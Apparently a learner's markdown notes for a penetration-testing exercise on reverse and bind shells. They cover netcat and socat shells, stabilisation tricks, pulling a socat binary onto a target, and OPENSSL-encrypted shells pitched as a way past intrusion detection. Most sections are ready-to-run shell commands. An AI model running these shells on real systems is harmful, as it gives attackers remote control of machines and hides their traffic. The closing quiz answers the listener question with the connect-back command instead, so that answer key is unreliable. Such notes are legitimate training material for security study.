# What the shell??

- There are a variety of tools that we will be using to receive reverse shells and to send bind shells. In general terms, we need malicious shell code, as well as a way of interfacing with the resulting shell. 

- `Netcat` - A tradional swiss army knife of Networking.
- `Socat` is like netcat on steroids. It can do all same things, and many more. Socat shells are usually more stable than netcat shells out of the box.
- `Metasploit - multi/handler` - this module is like a socat, and netcat - used to receive the reverse shells.
- One of the most prominent of these is [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings). The [PentestMonkey Reverse Shell Cheatsheet](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) is also commonly used.
-

## Types of Shells
- `Reverse shells` are when the target is forced to execute code that connects back to your computer. Reverse shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target; however, the drawback is that, when receiving a shell from a machine across the internet, you would need to configure your own network to accept the shell. Please see the example of reverse shell below using netcat
    ```bash
    sudo nc -lvnp 443 # On the attacking machine:
    nc <LOCAL-IP> <PORT> -e /bin/bash  # On the target:
    ```
- `Bind shells` are when the code executed on the target is used to start a listener attached to a shell directly on the target. This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code execution that way. This has the advantage of not requiring any configuration on your own network, but may be prevented by firewalls protecting the target. Please see the example of bind shell using the netcat.
    ```bash
    nc -lvnp <port> -e "cmd.exe" #On the target:
    nc MACHINE_IP <port> #On the attacking machine:
    ```

## Netcat Shell Stabilisation
- Ok, so we've caught or connected to a netcat shell, what next?
- Netcat shells are very unstable by default.They are non-interactive, and often have strange formatting errors. This is due to netcat "shells" really being processes running inside a terminal, rather than being bonafide terminals in their own right.
- Fortunately, there are many ways to stabilise netcat shells on Linux systems
#### Technique 1: Python
- The first thing to do is use `python -c 'import pty;pty.spawn("/bin/bash")'`, which uses Python to spawn a better featured bash shell; note that some targets may need the version of Python specified. If this is the case, replace python with python2 or python3 as required. At this point our shell will look a bit prettier, but we still won't be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.
- Step two is: `export TERM=xterm` - this will give us access to term commands such as `clear`.
- Finally (and most importantly) we will background the shell using `Ctrl + Z`. Back in our own terminal we use `stty raw -echo; fg`. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.
#### Technique 2: rlwrap
- rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell; however, some manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. rlwrap is not installed by default on Kali, so first install it with `sudo apt install rlwrap`.
- To use rlwrap, we invoke a slightly different listener: `rlwrap nc -lvnp <port>`
- Background the shell with Ctrl + Z, then use `stty raw -echo; fg` to stabilise and re-enter the shell.

#### Technique 3: Socat (Not installed on target)
- To accomplish this method of stabilisation we would first transfer a socat static compiled binary (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (`sudo python3 -m http.server 80`), then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (`wget <LOCAL-IP>/socat -O /tmp/socat`).
- For the sake of completeness: in a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed (`Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`). 


#### Terminal resize
- It's useful to be able to change your terminal tty size, It must be done manually in a reverse or bind shell if you want to use something like a text editor which overwrites everything on the screen.
- First, open another terminal and run `stty -a`. This will give you a large stream of output about the current shell. Next, in your reverse/bind shell, type in: `stty rows <number>` and `stty cols <number>` to get terminal resized.






## Socat
- The easiest way to think about socat is as a connector between two points. 
#### Reverse shells
```bash
#Reverse shell listener (similar to nc -lvnp <port>), Attacker.
socat TCP-L:<port> -
#Windows (on Target): pipes option used to force powershell to use unix style standard intput and output
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
#Linux (target)
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
```
#### Bind shells
```bash
#On linux target, we use
socat TCP-L:<port> EXEC:"bash -li"
#On windows target
socat TCP-L:<port> EXEC:powershell.exe,pipes
#And for attacking, regardless of machine
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```
    
- Now let's take a look at one of the more powerful uses for Socat: a fully stable Linux tty reverse shell listner. This will only work when the target is Linux, but is significantly more stable. ``socat TCP-L:<port> FILE:`tty`,raw,echo=0``
- The first listener can be connected to with any payload; however, this special listener must be activated with a very specific socat command. This means that the target must have socat installed. Most machines do not have socat installed by default; however, it's possible to upload a precompiled socat binary, which can then be executed as normal. You can download a precompiled socat binary from [this link](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true).
```bash
#The special command is as follows:
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
#This is a handful, so let's break it down.
#The first part is easy -- we're linking up with the listener running on our own machine. The second part of the command creates an interactive bash session with  EXEC:"bash -li". We're also passing the arguments: pty, stderr, sigint, setsid and sane:

#pty, allocates a pseudoterminal on the target -- part of the stabilisation process
#stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
#sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
#setsid, creates the process in a new session
#sane, stabilises the terminal, attempting to "normalise" it.
```


## Socat Encrypted Shells
- One of the many great things about socat is that it's capable of creating encrypted shells -- both bind and reverse. Why would we want to do this? Encrypted shells cannot be spied on unless you have the decryption key, and are often able to bypass an IDS as a result.
- Suffice to say that any time `TCP` was used as part of a command, this should be replaced with `OPENSSL` when working with encrypted shells.
```bash
# We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine: 
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
# This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. 
# When you run this command it will ask you to fill in information about the certificate. 
# This can be left blank, or filled randomly.
# We then need to merge the two created files into a single .pem file:
cat shell.key shell.crt > shell.pem
# Now, when we set up our reverse shell listener, we use:
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
# This sets up an OPENSSL listener using our generated certificate. 
# verify=0 tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority. 
# Please note that the certificate must be used on whichever device is listening.
# To connect back, we would use:
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash


# The same technique would apply for a bind shell:
# Target:
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
# Attacker:
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
```

- What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called "encrypt.pem" ? ```socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane```
- If your IP is 10.10.10.5, what syntax would you use to connect back to this listener? ```socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane```



































